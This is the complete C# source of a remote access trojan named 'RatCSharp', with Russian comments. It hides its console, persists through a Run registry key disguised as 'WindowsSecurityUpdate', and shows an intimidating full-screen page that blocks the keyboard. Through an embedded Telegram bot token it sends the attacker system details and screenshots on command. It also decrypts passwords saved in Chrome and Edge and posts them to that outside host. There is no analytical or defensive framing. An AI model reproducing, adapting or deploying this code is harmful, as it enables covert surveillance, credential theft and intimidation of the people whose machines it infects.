using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Data.SQLite;

namespace RatCSharp
{
    class Program
    {
        // ================= CONFIG =================
        static string BOT_TOKEN = "9010108280:AAH18qw9pxpEm_FiDTQtOp4KMOWpLJ9DqOE";
        static string ADMIN_ID = "8297446667";
        // ==========================================

        static HttpClient client = new HttpClient();
        static int lastUpdateId = 0;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static async Task Main(string[] args)
        {
            // Скрываем консоль
            ShowWindow(GetConsoleWindow(), 0); 
            
            AddToStartup();
            await SendMessage(ADMIN_ID, "🔴 <b>RAT C# АКТИВЕН</b>\nСистема взломана.");
            ShowScaryScreen();

            // Запускаем прослушку кнопок и кражу паролей
            ThreadPool.QueueUserWorkItem(async _ => await PollUpdates());
            ThreadPool.QueueUserWorkItem(_ => StealPasswords());

            Console.ReadLine(); 
        }

        static void AddToStartup()
        {
            try
            {
                string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("WindowsSecurityUpdate", path);
            }
            catch { }
        }

        static void ShowScaryScreen()
        {
            string html = @"<html><body style='background:black;color:red;text-align:center;margin-top:20%;font-family:monospace'>
            <h1 style='font-size:80px;animation:blink 1s infinite'>VAS ZAMETILI</h1>
            <p style='color:white;font-size:24px'>Мы видим тебя. Не пытайся закрыть.</p>
            <h2 id='t' style='color:lime;font-size:40px'>10:00</h2>
            <style>@keyframes blink{0%{opacity:1}50%{opacity:0}100%{opacity:1}}</style>
            <script>var t=600;setInterval(()=>{if(t<0)return;var m=Math.floor(t/60);var s=t%60;document.getElementById('t').innerText=m+':'+(s<10?'0':'')+s;t--},1000);document.addEventListener('keydown',e=>e.preventDefault());</script>
            </body></html>";
            string path = Path.GetTempFileName() + ".html";
            File.WriteAllText(path, html);
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(path) { UseShellExecute = true });
        }

        static async Task SendMessage(string chatId, string text)
        {
            var payload = new { chat_id = chatId, text = text, parse_mode = "HTML" };
            var json = JsonSerializer.Serialize(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            try { await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", content); } catch { }
        }

        static async Task SendPhoto(string chatId, byte[] photo, string caption)
        {
            var content = new MultipartFormDataContent();
            content.Add(new StringContent(chatId), "chat_id");
            content.Add(new StringContent(caption), "caption");
            content.Add(new ByteArrayContent(photo), "photo", "screen.png");
            try { await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", content); } catch { }
        }

        static async Task PollUpdates()
        {
            while (true)
            {
                try
                {
                    var res = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={lastUpdateId + 1}&timeout=30");
                    using var doc = JsonDocument.Parse(res);
                    var result = doc.RootElement.GetProperty("result");

                    foreach (var update in result.EnumerateArray())
                    {
                        lastUpdateId = update.GetProperty("update_id").GetInt32();

                        // Обработка нажатий на кнопки
                        if (update.TryGetProperty("callback_query", out var cb))
                        {
                            string data = cb.GetProperty("data").GetString();
                            string cbId = cb.GetProperty("id").GetString();
                            
                            await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery?callback_query_id={cbId}");
                            await HandleCallback(data);
                        }
                    }
                }
                catch { await Task.Delay(5000); }
                await Task.Delay(1000);
            }
        }

        static async Task HandleCallback(string data)
        {
            if (data == "info")
            {
                string info = $"<b>🔴 RAT АКТИВЕН</b>\n<b>OS:</b> {Environment.OSVersion}\n<b>User:</b> {Environment.UserName}\n<b>Host:</b> {Environment.MachineName}";
                await SendMessage(ADMIN_ID, info);
            }
            else if (data == "screen")
            {
                byte[] img = CaptureScreen();
                if (img != null) await SendPhoto(ADMIN_ID, img, "📸 Скриншот");
            }
            else if (data == "pass")
            {
                StealPasswords();
            }
        }

        static byte[] CaptureScreen()
        {
            try
            {
                Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap)) { g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size); }
                    using (MemoryStream ms = new MemoryStream()) { bitmap.Save(ms, ImageFormat.Png); return ms.ToArray(); }
                }
            }
            catch { return null; }
        }

        static void StealPasswords()
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string[] paths = {
                    Path.Combine(localAppData, "Google\\Chrome\\User Data\\Default\\Login Data"),
                    Path.Combine(localAppData, "Microsoft\\Edge\\User Data\\Default\\Login Data")
                };

                StringBuilder sb = new StringBuilder();
                foreach (string path in paths)
                {
                    if (!File.Exists(path)) continue;
                    string temp = Path.GetTempFileName();
                    File.Copy(path, temp, true);

                    using (var conn = new SQLiteConnection($"Data Source={temp};Version=3;"))
                    {
                        conn.Open();
                        using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string url = reader.GetString(0);
                                string user = reader.GetString(1);
                                byte[] encPass = (byte[])reader.GetValue(2);
                                if (string.IsNullOrEmpty(user)) continue;
                                string pass = DecryptPassword(encPass);
                                sb.AppendLine($"URL: {url}\nUser: {user}\nPass: {pass}\n");
                            }
                        }
                    }
                    File.Delete(temp);
                }

                if (sb.Length > 0)
                {
                    string txt = sb.ToString();
                    if (txt.Length > 4000) txt = txt.Substring(0, 4000) + "...";
                    SendMessage(ADMIN_ID, $"<b>🔑 Пароли:</b>\n<pre>{txt}</pre>");
                }
            }
            catch (Exception ex) { SendMessage(ADMIN_ID, $"❌ Ошибка паролей: {ex.Message}"); }
        }

        [DllImport("Crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        [StructLayout(LayoutKind.Sequential)]
        struct CRYPTPROTECT_PROMPTSTRUCT { public int cbSize; public int dwPromptFlags; public IntPtr hwndApp; public string szPrompt; }

        static string DecryptPassword(byte[] encryptedData)
        {
            try
            {
                DATA_BLOB inBlob = new DATA_BLOB { cbData = encryptedData.Length, pbData = Marshal.AllocHGlobal(encryptedData.Length) };
                Marshal.Copy(encryptedData, 0, inBlob.pbData, encryptedData.Length);
                DATA_BLOB outBlob = new DATA_BLOB();
                DATA_BLOB entropy = new DATA_BLOB();
                CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT { cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT)) };

                bool success = CryptUnprotectData(ref inBlob, null, ref entropy, IntPtr.Zero, ref prompt, 0, ref outBlob);
                string result = "<encrypted>";
                if (success)
                {
                    byte[] outData = new byte[outBlob.cbData];
                    Marshal.Copy(outBlob.pbData, outData, 0, outBlob.cbData);
                    result = Encoding.UTF8.GetString(outData);
                }
                Marshal.FreeHGlobal(inBlob.pbData);
                return result;
            }
            catch { return "<err>"; }
        }
    }
}
